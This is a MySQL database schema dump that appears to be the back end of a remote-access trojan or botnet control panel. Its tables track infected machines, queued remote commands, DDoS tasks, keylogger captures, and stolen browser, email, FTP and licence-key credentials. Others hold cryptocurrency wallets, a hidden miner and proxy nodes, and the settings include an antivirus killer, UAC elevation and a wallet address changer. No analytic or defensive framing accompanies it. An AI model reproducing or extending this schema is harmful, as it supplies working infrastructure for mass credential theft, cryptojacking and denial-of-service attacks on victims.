
SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;


--
-- Table structure for table `clients`
--

CREATE TABLE IF NOT EXISTS `clients` (
  `id` int(10) NOT NULL,
  `ip` varchar(45) COLLATE utf8_unicode_ci NOT NULL,
  `cc` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `country` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `ratgroup` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `lastcheck` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `install_date` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
  `status` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `userandpc` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `operatingsystem` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `antivirus` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `firewall` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `systemram` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `cpu` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `cputhreads` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `gpu` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `gpuram` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `systemdrive` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `systemdrivesize` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `hwid` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `installpath` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `netframeworkversion` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `defaultbrowser` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `systemuptime` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `userprivilegies` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `pctype` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `ratversion` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `cloud`
--

CREATE TABLE IF NOT EXISTS `cloud` (
  `id` int(20) NOT NULL,
  `hash` varchar(128) CHARACTER SET latin1 NOT NULL,
  `filename` varchar(255) CHARACTER SET latin1 NOT NULL,
  `link` varchar(1000) CHARACTER SET latin1 NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `commands`
--

CREATE TABLE IF NOT EXISTS `commands` (
  `id` int(255) NOT NULL,
  `taskname` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `hwid` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `cmd` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `url` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `fileloc` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `arguments` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `md5` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `procname` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `port` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `use_tor` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `viewed` varchar(8) COLLATE utf8_unicode_ci NOT NULL,
  `time` int(128) NOT NULL,
  `creation` int(255) NOT NULL,
  `status` varchar(12) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `ddos`
--

CREATE TABLE IF NOT EXISTS `ddos` (
  `id` int(255) NOT NULL,
  `hwid` varchar(255) CHARACTER SET latin1 NOT NULL,
  `taskname` varchar(255) CHARACTER SET latin1 NOT NULL,
  `type` varchar(255) CHARACTER SET latin1 NOT NULL,
  `target` varchar(255) CHARACTER SET latin1 NOT NULL,
  `duration` int(255) NOT NULL,
  `creation` int(255) NOT NULL,
  `packet` varchar(255) CHARACTER SET latin1 NOT NULL,
  `status` varchar(255) CHARACTER SET latin1 NOT NULL,
  `viewed` int(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `errors`
--

CREATE TABLE IF NOT EXISTS `errors` (
  `id` int(255) NOT NULL,
  `hwid` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `last_occurred` int(255) NOT NULL,
  `occurrences` int(255) NOT NULL,
  `hash` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `header` varchar(510) COLLATE utf8_unicode_ci NOT NULL,
  `description` varchar(510) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `exclusions`
--

CREATE TABLE IF NOT EXISTS `exclusions` (
  `name` varchar(255) CHARACTER SET latin1 NOT NULL,
  `hash` varchar(128) CHARACTER SET latin1 NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `history`
--

CREATE TABLE IF NOT EXISTS `history` (
  `id` int(8) NOT NULL,
  `time` int(64) NOT NULL,
  `online` int(8) NOT NULL,
  `offline` int(8) NOT NULL,
  `dead` int(8) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `history`
--

INSERT INTO `history` (`id`, `time`, `online`, `offline`, `dead`) VALUES
(1, 0, 0, 0, 0),
(2, 3600, 0, 0, 0),
(3, 7200, 0, 0, 0),
(4, 10800, 0, 0, 0),
(5, 14400, 0, 0, 0),
(6, 18000, 0, 0, 0),
(7, 21600, 0, 0, 0),
(8, 25200, 0, 0, 0),
(9, 28800, 0, 0, 0),
(10, 32400, 0, 0, 0),
(11, 36000, 0, 0, 0),
(12, 39600, 0, 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `keylogger`
--

CREATE TABLE IF NOT EXISTS `keylogger` (
  `id` int(255) NOT NULL,
  `hwid` varchar(255) CHARACTER SET latin1 NOT NULL,
  `date` varchar(255) CHARACTER SET latin1 NOT NULL,
  `latest_update` int(255) NOT NULL,
  `content` text CHARACTER SET latin1 NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=ascii;

-- --------------------------------------------------------

--
-- Table structure for table `keylogger_filter`
--

CREATE TABLE IF NOT EXISTS `keylogger_filter` (
  `id` int(255) NOT NULL,
  `window_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- --------------------------------------------------------

--
-- Table structure for table `logs_browser`
--

CREATE TABLE IF NOT EXISTS `logs_browser` (
  `id` int(255) NOT NULL,
  `hwid` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `hash` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `browser` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `url` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `logs_email`
--

CREATE TABLE IF NOT EXISTS `logs_email` (
  `id` int(255) NOT NULL,
  `hwid` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `hash` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `client` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `logs_ftp`
--

CREATE TABLE IF NOT EXISTS `logs_ftp` (
  `id` int(255) NOT NULL,
  `hwid` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `hash` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `client` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `server` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `logs_games`
--

CREATE TABLE IF NOT EXISTS `logs_games` (
  `id` int(255) NOT NULL,
  `hwid` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `hash` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `application` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `version` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `licence_key` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `logs_software`
--

CREATE TABLE IF NOT EXISTS `logs_software` (
  `id` int(255) NOT NULL,
  `hwid` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `hash` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `application` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `version` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `licence_key` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `miner`
--

CREATE TABLE IF NOT EXISTS `miner` (
  `id` int(11) NOT NULL,
  `hwid` varchar(255) CHARACTER SET latin1 NOT NULL,
  `taskname` varchar(255) CHARACTER SET latin1 NOT NULL,
  `engine` varchar(255) CHARACTER SET latin1 NOT NULL,
  `commandline` varchar(1000) CHARACTER SET latin1 NOT NULL,
  `creation` varchar(255) CHARACTER SET latin1 NOT NULL,
  `duration` int(255) NOT NULL,
  `viewed` int(255) NOT NULL,
  `status` varchar(255) CHARACTER SET latin1 NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `proxy`
--

CREATE TABLE IF NOT EXISTS `proxy` (
  `id` int(11) NOT NULL,
  `hwid` varchar(255) CHARACTER SET latin1 NOT NULL,
  `type` varchar(20) CHARACTER SET latin1 NOT NULL,
  `ip` varchar(64) CHARACTER SET latin1 NOT NULL,
  `cc` varchar(5) CHARACTER SET latin1 NOT NULL,
  `country` varchar(255) CHARACTER SET latin1 NOT NULL,
  `port` varchar(10) CHARACTER SET latin1 NOT NULL,
  `status` varchar(255) CHARACTER SET latin1 NOT NULL,
  `latency` varchar(255) CHARACTER SET latin1 NOT NULL,
  `lastchecked` int(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--

CREATE TABLE IF NOT EXISTS `settings` (
  `id` int(30) NOT NULL,
  `type` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `value` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM AUTO_INCREMENT=43 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `settings`
--

INSERT INTO `settings` (`id`, `type`, `value`) VALUES
(1, 'cloud_inspection', 'False'),
(2, 'offline_time', '2'),
(3, 'dead_time', '7'),
(4, 'knock_time', '1'),
(5, 'security_key', '6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b'),
(6, 'uac_elevation', 'False'),
(7, 'socks', 'False'),
(8, 'error_reporting', 'False'),
(9, 'upnp', 'False'),
(10, 'recover_passwords', 'False'),
(11, 'recover_wallets', 'False'),
(12, 'prevent_standby', 'False'),
(13, 'antivirus_killer', 'False'),
(14, 'private_key', ''),
(15, 'public_key', ''),
(16, 'cycle_time', ''),
(17, 'run_once_on_startup', 'False'),
(18, 'disable_critical', 'False'),
(19, 'remove_associated_keys', 'False'),
(20, 'remove_associated_files', 'False'),
(21, 'suspend_process', 'False'),
(22, 'socks_port', '3128'),
(23, 'socks_auth', 'False'),
(24, 'socks_username', 'Nothing'),
(25, 'socks_password', 'Nothing'),
(26, 'last_cleanup_time', '0'),
(27, 'keylogger_interval', '1'),
(28, 'keylogger_maxchar', '500'),
(29, 'keylogger_enabled', 'False'),
(30, 'enable_walletchanger', 'False'),
(31, 'btc_address', 'MyBtc'),
(32, 'ltc_address', 'MyLtc'),
(33, 'keylogger_filter', 'False'),
(34, 'browser_recovery', 'False'),
(35, 'ftp_recovery', 'False'),
(36, 'email_recovery', 'False'),
(37, 'software_recovery', 'False'),
(38, 'games_recovery', 'False'),
(40, 'automatic_update', 'False'),
(41, 'update_file_hash', 'N/A'),
(42, 'installed_file_hash', 'N/A');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `password` char(64) COLLATE utf8_unicode_ci NOT NULL,
  `salt` char(16) COLLATE utf8_unicode_ci NOT NULL,
  `admin` varchar(32) COLLATE utf8_unicode_ci NOT NULL,
  `suspended` varchar(16) COLLATE utf8_unicode_ci NOT NULL,
  `expiration` int(255) NOT NULL,
  `creation_date` int(255) NOT NULL,
  `last_visit` int(255) NOT NULL,
  `first_login` int(255) NOT NULL,
  `count_on_login` varchar(32) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `visitors`
--

CREATE TABLE IF NOT EXISTS `visitors` (
  `id` int(255) NOT NULL,
  `ip` varchar(45) COLLATE utf8_unicode_ci NOT NULL,
  `cc` varchar(3) COLLATE utf8_unicode_ci NOT NULL,
  `country` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `last_visit` int(255) NOT NULL,
  `page` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `useragent` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wallets`
--

CREATE TABLE IF NOT EXISTS `wallets` (
  `id` int(255) NOT NULL,
  `hwid` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `coin` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `hash` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `size` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `link` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `clients`
--
ALTER TABLE `clients`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `hwid` (`hwid`);

--
-- Indexes for table `cloud`
--
ALTER TABLE `cloud`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `commands`
--
ALTER TABLE `commands`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ddos`
--
ALTER TABLE `ddos`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `errors`
--
ALTER TABLE `errors`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `hash` (`hash`);

--
-- Indexes for table `history`
--
ALTER TABLE `history`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `keylogger`
--
ALTER TABLE `keylogger`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `keylogger_filter`
--
ALTER TABLE `keylogger_filter`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logs_browser`
--
ALTER TABLE `logs_browser`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logs_email`
--
ALTER TABLE `logs_email`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logs_ftp`
--
ALTER TABLE `logs_ftp`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logs_games`
--
ALTER TABLE `logs_games`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logs_software`
--
ALTER TABLE `logs_software`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `miner`
--
ALTER TABLE `miner`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `proxy`
--
ALTER TABLE `proxy`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- Indexes for table `visitors`
--
ALTER TABLE `visitors`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wallets`
--
ALTER TABLE `wallets`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `clients`
--
ALTER TABLE `clients`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `cloud`
--
ALTER TABLE `cloud`
  MODIFY `id` int(20) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `commands`
--
ALTER TABLE `commands`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `ddos`
--
ALTER TABLE `ddos`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `errors`
--
ALTER TABLE `errors`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `keylogger`
--
ALTER TABLE `keylogger`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `keylogger_filter`
--
ALTER TABLE `keylogger_filter`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `logs_browser`
--
ALTER TABLE `logs_browser`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `logs_email`
--
ALTER TABLE `logs_email`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `logs_ftp`
--
ALTER TABLE `logs_ftp`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `logs_games`
--
ALTER TABLE `logs_games`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `logs_software`
--
ALTER TABLE `logs_software`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `miner`
--
ALTER TABLE `miner`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `proxy`
--
ALTER TABLE `proxy`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(30) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=43;
--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;
--
-- AUTO_INCREMENT for table `visitors`
--
ALTER TABLE `visitors`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `wallets`
--


ALTER TABLE `wallets`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
